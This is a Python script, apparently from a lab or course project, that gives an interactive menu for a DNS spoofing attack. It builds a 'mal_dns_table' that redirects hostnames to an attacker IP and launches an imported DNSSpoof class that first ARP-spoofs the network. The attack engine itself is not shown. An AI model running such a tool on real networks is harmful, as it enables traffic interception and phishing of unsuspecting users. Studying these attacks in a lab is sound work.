import os
from dns_spoofing import DNSSpoof
from utils.interface import InterfaceConfig


interface_config = InterfaceConfig("eth0", "08:00:27:95:bd:54",
									   "192.168.56.169")

def main():
	start_dns_attack()


def start_dns_attack():

	# have this loaded from a json file??
	CONFIG = {
		"mal_dns_table": {"www.example.com": interface_config.IP_ADDR},
		"forwarding": False,

	}

	print(r"""
	                                                               
                                            ██████████                                  
                                      ░░  ██░░░░░░░░░░██                                
                                        ██░░░░░░░░░░░░░░██                              
                                        ██░░░░░░░░████░░██████████                      
                            ██          ██░░░░░░░░████░░██▒▒▒▒▒▒██                      
                          ██░░██        ██░░░░░░░░░░░░░░██▒▒▒▒▒▒██                      
                          ██░░░░██      ██░░░░░░░░░░░░░░████████                        
                        ██░░░░░░░░██      ██░░░░░░░░░░░░██                              
                        ██░░░░░░░░████████████░░░░░░░░██                                
                        ██░░░░░░░░██░░░░░░░░░░░░░░░░░░░░██                              
                        ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                            
                        ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                            
                        ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                            
                        ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                            
                        ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                            
                        ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                              
                          ██░░░░░░░░░░░░░░░░░░░░░░░░░░██                                
                            ██████░░░░░░░░░░░░░░░░████                                  
                                  ████████████████                                      
                                                                                        

		""")

	while True:
		

		print(r"""
		 _               _____            _                 _____  _   _  _____    _____                    __ _             
| |             |  __ \          (_)               |  __ \| \ | |/ ____|  / ____|                  / _(_)            
| |     ___  ___| |__) |_ _ _ __  _ _ __ ___  ___  | |  | |  \| | (___   | (___  _ __   ___   ___ | |_ _ _ __   __ _ 
| |    / _ \/ __|  ___/ _` | '_ \| | '__/ _ \/ __| | |  | | . ` |\___ \   \___ \| '_ \ / _ \ / _ \|  _| | '_ \ / _` |
| |___| (_) \__ \ |  | (_| | |_) | | | |  __/\__ \ | |__| | |\  |____) |  ____) | |_) | (_) | (_) | | | | | | | (_| |
|______\___/|___/_|   \__,_| .__/|_|_|  \___||___/ |_____/|_| \_|_____/  |_____/| .__/ \___/ \___/|_| |_|_| |_|\__, |
                           | |                                                  | |                             __/ |
                           |_|                                                  |_|                            |___/ 
	""")
		print("🦆🦆Welcome to LosPapiers' DNS Spoofing🦆🦆")
		print("Please follow the configuration below:\n")
		log("1", f"Setup spoofed DNS table \n \t Currently: {CONFIG['mal_dns_table']} ")
		log("2", f"Toggle forwarding? Currently: {CONFIG['forwarding']} ")
		log("3", "Start attack (WILL PERFOMR ARP Spoofing FIRST")
		log("4", "EXIT")

		choice = input("Choose: ").strip()
		
		clear()
		if choice == "1":
			while True:
				log("info", "Configuring DNS entries:\n")
				log("current entries", f"\n{CONFIG['mal_dns_table']}")

				log("1", "Add a new entry")
				log("2", "Quit")

				option = input("\nChoose: ")
				
				if option == "2":
					break

				clear()
				address = input("Type the host name you want to spoof(e.g. www.example.com): ")
				ip = input(f"Type the ip address to redirect to(e.g. {interface_config.IP_ADDR}): ")

				clear()

				CONFIG['mal_dns_table'][address] = ip
				log("succes", f"Added entry: {address}: {ip}\n")


		elif choice == "2":
			CONFIG["forwarding"] = not CONFIG["forwarding"]
			log("success", f"Forwading set to {CONFIG['forwarding']} ")

		elif choice == "3":
			log("info", "Starting attack!!")
			log("info", "Press CTRL + C to stop the attack")
			dns_attack = DNSSpoof(net_interface = interface_config,
									forward=CONFIG["forwarding"],
									mal_dns_table=CONFIG["mal_dns_table"])
			
			dns_attack.start_attack()
		
		elif choice == "4":
			exit()

		clear()
		



def clear():
	os.system("clear")

def log(prefix: str, message: str) -> None:
	print(f"[{prefix.upper()}]: {message}\n")


if __name__ == "__main__":
	main()

